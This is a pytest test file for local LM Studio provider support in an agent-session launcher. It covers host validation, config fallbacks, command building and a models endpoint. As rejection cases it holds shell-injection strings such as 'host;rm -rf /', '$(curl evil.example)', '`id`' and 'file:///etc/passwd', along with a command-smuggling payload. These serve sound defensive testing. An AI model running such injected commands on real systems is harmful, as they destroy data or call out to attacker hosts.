"""Local-inference (LM Studio) provider support.

Covers:
- ``normalize_local_host`` accept/reject matrix (the shell + SSRF gate)
- ``ProvidersConfig.local_host`` default, normalization, fail-soft on garbage,
  and backward compat with a config.json that has no such key
- ``Settings.get_local_host()`` including the degraded-auth-config path
- ``Settings.get_agent_command()`` local branch (``cldl``) AND byte-identical
  output on the pre-existing ``cld`` / ``cldor`` paths (the regression risk)
- shell-injection containment for both ``model`` and ``local_host``
- ``provider`` field on ``CreateSessionRequest`` / ``Session`` + legacy JSON
- ``GET /api/v1/providers/local/models``: happy path with embedding models
  filtered out, and the unreachable case answering 200 + ``reachable=False``
"""
from __future__ import annotations

import atexit
import json
import os
import shutil
import socket
import sys
import tempfile
from pathlib import Path
from types import SimpleNamespace

import pytest


# ---- minimal env bootstrap so ``src.config`` import succeeds -----------
#
# These two dirs must exist BEFORE ``src.config`` (and everything that
# imports it below) is imported, so they can't be built by a normal pytest
# fixture — fixtures only run once collection/imports are already done.
# ``atexit`` guarantees the ``mkdtemp()`` output still gets swept on
# interpreter exit (pass, fail, or collection error alike) instead of
# leaking a fresh ``/tmp/cc_local_*`` dir on every test run.
_LOCAL_TEST_WD = tempfile.mkdtemp(prefix="cc_local_wd_")
_LOCAL_TEST_LOGS = tempfile.mkdtemp(prefix="cc_local_logs_")
atexit.register(shutil.rmtree, _LOCAL_TEST_WD, ignore_errors=True)
atexit.register(shutil.rmtree, _LOCAL_TEST_LOGS, ignore_errors=True)
os.environ.setdefault("DEFAULT_WORKING_DIR", _LOCAL_TEST_WD)
os.environ.setdefault("LOG_DIRECTORY", _LOCAL_TEST_LOGS)
os.environ.setdefault("TOTP_SECRET", "testsecretnotreal")
os.environ.setdefault("JWT_SECRET", "testjwtnotreal")

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

# ruff: noqa: E402
import httpx
from fastapi import FastAPI
from fastapi.testclient import TestClient
from pydantic import ValidationError

import src.api.routes as routes_mod
from src.api.auth import require_auth
from src.config import (
    AgentsConfig,
    ProvidersConfig,
    Settings,
    _DEFAULT_LOCAL_HOST,
    _DEFAULT_PROVIDER_MODELS,
)
from src.models import (
    CreateSessionRequest,
    Session,
    normalize_local_host,
)


_DEFAULT_HOST = "192.168.1.167:1234"


# --------------------------------------------------------------------------- #
# normalize_local_host — the primary gate for a value that reaches BOTH a
# shell command string and an outbound HTTP request.
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "raw,expected",
    [
        ("192.168.1.167:1234", "192.168.1.167:1234"),
        ("  192.168.1.167:1234  ", "192.168.1.167:1234"),
        ("192.168.1.167:1234/", "192.168.1.167:1234"),
        ("http://192.168.1.167:1234", "http://192.168.1.167:1234"),
        ("https://lmstudio.lan:1234", "https://lmstudio.lan:1234"),
        # Surrounding whitespace (incl. a trailing newline from a
        # hand-edited config.json) is stripped, not rejected.
        ("192.168.1.167:1234\n", "192.168.1.167:1234"),
        ("localhost", "localhost"),
        ("localhost:1234", "localhost:1234"),
        ("my-box.home.lan:65535", "my-box.home.lan:65535"),
    ],
)
def test_normalize_local_host_accepts_plain_hosts(raw, expected):
    assert normalize_local_host(raw) == expected


@pytest.mark.parametrize(
    "raw",
    [
        "",
        "   ",
        "192.168.1.167:1234/v1/models",          # path
        "192.168.1.167:1234?x=1",                # query
        "user@192.168.1.167:1234",               # userinfo
        "192.168.1.167:0",                       # port out of range
        "192.168.1.167:70000",                   # port out of range
        "192.168.1.167:123456",                  # port too long
        "192.168.1.167\n:1234",                  # embedded newline
        "192.168.1.167 :1234",                   # whitespace inside
        "host;rm -rf /",                         # shell metachars
        "$(curl evil.example)",
        "`id`",
        "file:///etc/passwd",
        "ftp://192.168.1.167:1234",              # non-http scheme
        "-badhost:1234",                         # leading dash
        "[::1]:1234",                            # IPv6 literal (unsupported)
        None,
        1234,
    ],
)
def test_normalize_local_host_rejects_everything_else(raw):
    assert normalize_local_host(raw) is None


# --------------------------------------------------------------------------- #
# ProvidersConfig.local_host — additive field, fail-soft validator
# --------------------------------------------------------------------------- #


def test_providers_config_local_host_defaults():
    cfg = ProvidersConfig()
    assert cfg.local_host == _DEFAULT_LOCAL_HOST == _DEFAULT_HOST


def test_providers_config_legacy_json_without_local_host_still_loads():
    """A config.json written before this key existed must deserialize
    unchanged: default host, models list untouched."""
    cfg = ProvidersConfig(**{"models": ["openai/gpt-5.6-sol"]})
    assert cfg.local_host == _DEFAULT_HOST
    assert cfg.models == ["openai/gpt-5.6-sol"]


def test_providers_config_empty_json_keeps_default_models_and_host():
    cfg = ProvidersConfig(**{})
    assert cfg.models == list(_DEFAULT_PROVIDER_MODELS)
    assert cfg.local_host == _DEFAULT_HOST


def test_providers_config_local_host_normalizes():
    assert ProvidersConfig(local_host="  10.0.0.5:8080/ ").local_host == "10.0.0.5:8080"


@pytest.mark.parametrize(
    "bad",
    ["", "10.0.0.5:1234/v1", "host;touch /tmp/pwn", "$(id)", "10.0.0.5:0"],
)
def test_providers_config_local_host_fails_soft_to_default(bad):
    """A hand-edited/corrupt value must not brick startup — it falls back
    to the default, mirroring the models validator's drop-with-a-warning."""
    assert ProvidersConfig(local_host=bad).local_host == _DEFAULT_HOST


# --------------------------------------------------------------------------- #
# Settings helpers
# --------------------------------------------------------------------------- #


def _settings(providers: ProvidersConfig | None = None,
              agents: AgentsConfig | None = None) -> Settings:
    """Settings instance with ``load_auth_config`` stubbed (same trick the
    agent_type suite uses — pydantic v2 BaseSettings blocks assignment of
    non-field names, so install the stand-in via object.__setattr__)."""
    s = Settings(
        default_working_dir=os.environ["DEFAULT_WORKING_DIR"],
        log_directory=os.environ["LOG_DIRECTORY"],
    )
    fake = SimpleNamespace(
        agents=agents or AgentsConfig(),
        providers=providers or ProvidersConfig(),
    )
    object.__setattr__(s, "load_auth_config", lambda: fake)
    return s


def test_get_local_host_reads_config():
    s = _settings(ProvidersConfig(local_host="10.0.0.9:4321"))
    assert s.get_local_host() == "10.0.0.9:4321"


def test_get_local_host_falls_back_when_auth_config_unloadable():
    """The session-launch path must survive a missing/broken config.json
    rather than failing the spawn."""
    s = Settings(
        default_working_dir=os.environ["DEFAULT_WORKING_DIR"],
        log_directory=os.environ["LOG_DIRECTORY"],
    )

    def boom():
        raise RuntimeError("auth config missing")

    object.__setattr__(s, "load_auth_config", boom)
    assert s.get_local_host() == _DEFAULT_HOST


# --------------------------------------------------------------------------- #
# get_agent_command — the local branch, and NO regression on the other two
# --------------------------------------------------------------------------- #

_EXPECT_CLD = "zsh -c 'source ~/.zshrc >/dev/null 2>&1; cld'"
_EXPECT_CLDOR = "zsh -c 'source ~/.zshrc >/dev/null 2>&1; cldor openai/gpt-5.6-sol'"


@pytest.mark.parametrize("provider", [None, "openrouter"])
def test_no_model_still_runs_cld_verbatim(provider):
    """The default path must be byte-identical to pre-local behavior."""
    s = _settings()
    assert s.get_agent_command("claude", provider=provider) == _EXPECT_CLD


@pytest.mark.parametrize("provider", [None, "openrouter"])
def test_model_without_local_provider_still_runs_cldor_verbatim(provider):
    """The OpenRouter path must be byte-identical to pre-local behavior."""
    s = _settings()
    cmd = s.get_agent_command("claude", model="openai/gpt-5.6-sol", provider=provider)
    assert cmd == _EXPECT_CLDOR


def test_local_provider_runs_cldl_pinned_to_configured_host():
    s = _settings(ProvidersConfig(local_host=_DEFAULT_HOST))
    cmd = s.get_agent_command(
        "claude", model="qwen3.8-27b-uncensored", provider="local"
    )
    assert cmd == (
        "zsh -c 'source ~/.zshrc >/dev/null 2>&1; "
        "CLDL_HOST=192.168.1.167:1234 cldl qwen3.8-27b-uncensored'"
    )


def test_local_provider_honors_a_custom_host():
    s = _settings(ProvidersConfig(local_host="http://10.0.0.9:4321"))
    cmd = s.get_agent_command("claude", model="foo-model", provider="local")
    assert "CLDL_HOST=http://10.0.0.9:4321 cldl foo-model" in cmd


def test_local_provider_without_model_is_rejected_not_degraded():
    """Silently falling through to ``cld`` would launch a different
    provider than the caller asked for."""
    s = _settings()
    with pytest.raises(ValueError, match="requires a model id"):
        s.get_agent_command("claude", provider="local")


def test_local_provider_ignored_for_non_claude_agents():
    """``provider`` is only meaningful for the claude agent_type."""
    agents = AgentsConfig()
    s = _settings(agents=agents)
    assert s.get_agent_command("codex", provider="local") == agents.codex_command


def test_local_command_shell_injection_defused():
    """Round-trip the produced string through the SAME mechanism tmux uses
    (``$SHELL -c <string>``) with ``cldl`` swapped for an argv probe, and
    prove a malicious model stays exactly one literal token and the
    CLDL_HOST assignment can't spawn a second command."""
    import subprocess

    s = _settings(ProvidersConfig(local_host=_DEFAULT_HOST))
    payload = "foo; touch /tmp/should_never_exist_cldl_pwn; echo"
    cmd = s.get_agent_command("claude", model=payload, provider="local")

    probed = cmd.replace(
        "source ~/.zshrc >/dev/null 2>&1; ",
        'cldl() { echo "ARGC:$#|GOT:[$1]|HOST:[$CLDL_HOST]"; }; ',
    )
    proc = subprocess.run(
        ["zsh", "-c", probed], capture_output=True, text=True, timeout=5
    )
    assert proc.stdout.strip() == (
        f"ARGC:1|GOT:[{payload}]|HOST:[{_DEFAULT_HOST}]"
    )
    assert not os.path.exists("/tmp/should_never_exist_cldl_pwn")


# --------------------------------------------------------------------------- #
# provider field — request model + persisted session record
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize("provider", ["openrouter", "local", None])
def test_create_session_request_accepts_known_providers(provider):
    req = CreateSessionRequest(model="qwen3.8-27b-uncensored", provider=provider)
    assert req.provider == provider


def test_create_session_request_provider_defaults_to_none():
    assert CreateSessionRequest().provider is None


def test_create_session_request_rejects_unknown_provider():
    with pytest.raises(ValidationError):
        CreateSessionRequest(provider="anthropic-direct")


@pytest.mark.parametrize("provider", ["openrouter", "local", None])
def test_session_provider_round_trip(provider):
    s = Session(
        id="ses_abc12345",
        working_dir="/tmp/foo",
        model="qwen3.8-27b-uncensored",
        provider=provider,
    )
    reloaded = Session(**s.model_dump())
    assert reloaded.provider == provider


def test_legacy_session_json_without_provider_loads():
    """session_metadata.json files written before the field existed."""
    legacy = {
        "id": "ses_legacy",
        "working_dir": "/tmp/legacy",
        "status": "running",
        "agent_type": "claude",
        "model": "openai/gpt-5.6-sol",
    }
    s = Session(**json.loads(json.dumps(legacy)))
    assert s.provider is None
    assert s.model == "openai/gpt-5.6-sol"


# --------------------------------------------------------------------------- #
# GET /api/v1/providers/local/models
# --------------------------------------------------------------------------- #


@pytest.fixture
def local_app():
    app = FastAPI()
    app.include_router(routes_mod.router, prefix="/api/v1")
    app.dependency_overrides[require_auth] = lambda: True
    return app


@pytest.fixture
def patch_host():
    """Pin the module-level ``settings.get_local_host`` for one test.

    ``monkeypatch.setattr`` can't be used here: pydantic v2 BaseSettings
    rejects assignment of non-field names. Install a bound stand-in via
    object.__setattr__ (same trick the agent_type suite uses) and pop it
    back out of the instance ``__dict__`` on teardown.
    """
    def _set(host: str):
        object.__setattr__(routes_mod.settings, "get_local_host", lambda: host)

    yield _set
    routes_mod.settings.__dict__.pop("get_local_host", None)


def _free_port() -> int:
    """A port nothing is listening on — bind, read, release."""
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def test_local_models_filters_embeddings(local_app, monkeypatch, patch_host):
    """Real LM Studio payload shape: the embedding model must not reach
    the picker (it can't serve chat)."""
    payload = {
        "data": [
            {"id": "qwen3.8-27b-uncensored", "object": "model"},
            {"id": "text-embedding-nomic-embed-text-v1.5", "object": "model"},
        ]
    }

    class _Resp:
        status_code = 200

        def raise_for_status(self):
            return None

        async def aiter_bytes(self):
            yield json.dumps(payload).encode()

    class _StreamCtx:
        async def __aenter__(self):
            return _Resp()

        async def __aexit__(self, *a):
            return False

    class _Client:
        def __init__(self, *a, **kw):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        def stream(self, method, url):
            assert method == "GET"
            assert url == "http://192.168.1.167:1234/v1/models"
            return _StreamCtx()

    patch_host(_DEFAULT_HOST)
    monkeypatch.setattr(httpx, "AsyncClient", _Client)

    with TestClient(local_app) as client:
        r = client.get("/api/v1/providers/local/models")

    assert r.status_code == 200
    assert r.json() == {
        "host": _DEFAULT_HOST,
        "models": ["qwen3.8-27b-uncensored"],
        "reachable": True,
        "error": None,
    }


def test_local_models_drops_ids_the_launch_path_would_reject(
    local_app, monkeypatch, patch_host
):
    """An id outside MODEL_ID_PATTERN can never be launched, so never
    offer it — same single-source-of-truth validator as session create."""
    payload = {"data": [{"id": "good-model"}, {"id": "bad model; rm -rf /"}, {"id": 7}]}

    class _Resp:
        status_code = 200

        def raise_for_status(self):
            return None

        async def aiter_bytes(self):
            yield json.dumps(payload).encode()

    class _StreamCtx:
        async def __aenter__(self):
            return _Resp()

        async def __aexit__(self, *a):
            return False

    class _Client:
        def __init__(self, *a, **kw):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        def stream(self, method, url):
            return _StreamCtx()

    patch_host(_DEFAULT_HOST)
    monkeypatch.setattr(httpx, "AsyncClient", _Client)

    with TestClient(local_app) as client:
        r = client.get("/api/v1/providers/local/models")

    assert r.status_code == 200
    assert r.json()["models"] == ["good-model"]


def test_local_models_unreachable_host_returns_200_not_500(local_app, patch_host):
    """A dead box must inform the picker, not break it. No mocking here —
    this dials a genuinely closed port."""
    dead = f"127.0.0.1:{_free_port()}"
    patch_host(dead)

    with TestClient(local_app) as client:
        r = client.get("/api/v1/providers/local/models")

    assert r.status_code == 200
    body = r.json()
    assert body["reachable"] is False
    assert body["models"] == []
    assert body["host"] == dead
    assert dead in body["error"]


def test_local_models_oversized_body_returns_200_not_500(
    local_app, monkeypatch, patch_host
):
    """A hostile/MITM'd ``local_host`` that slow-drips or dumps an
    oversized body must land on the same 200 + ``reachable=False`` path as
    any other bad response — never a 500, never an unbounded read. The
    fake below sends more than the 1 MiB cap across several chunks so the
    cap is proven to apply against the running total, not a single read."""

    class _OversizedResp:
        status_code = 200

        def raise_for_status(self):
            return None

        async def aiter_bytes(self):
            chunk = b"x" * (512 * 1024)  # 512 KiB
            for _ in range(3):  # 1.5 MiB total, cap is 1 MiB
                yield chunk

    class _StreamCtx:
        async def __aenter__(self):
            return _OversizedResp()

        async def __aexit__(self, *a):
            return False

    class _Client:
        def __init__(self, *a, **kw):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *a):
            return False

        def stream(self, method, url):
            assert method == "GET"
            return _StreamCtx()

    patch_host(_DEFAULT_HOST)
    monkeypatch.setattr(httpx, "AsyncClient", _Client)

    with TestClient(local_app) as client:
        r = client.get("/api/v1/providers/local/models")

    assert r.status_code == 200
    body = r.json()
    assert body["reachable"] is False
    assert body["models"] == []
    assert "large" in body["error"].lower()


def test_local_models_requires_auth():
    """The auth gate is wired (no dependency_overrides here)."""
    app = FastAPI()
    app.include_router(routes_mod.router, prefix="/api/v1")
    with TestClient(app) as client:
        r = client.get("/api/v1/providers/local/models")
    assert r.status_code in (401, 403)


# --------------------------------------------------------------------------- #
# POST /api/v1/sessions — provider="local" without a model
# --------------------------------------------------------------------------- #


def test_create_session_local_without_model_is_400(local_app):
    """Explicit 400 (not a generic 500 from the handler's blanket except,
    and not a silent fall-through to ``cld``)."""
    local_app.state.session_manager = SimpleNamespace()
    with TestClient(local_app) as client:
        r = client.post("/api/v1/sessions", json={"provider": "local"})
    assert r.status_code == 400
    assert "requires a model id" in r.json()["detail"]
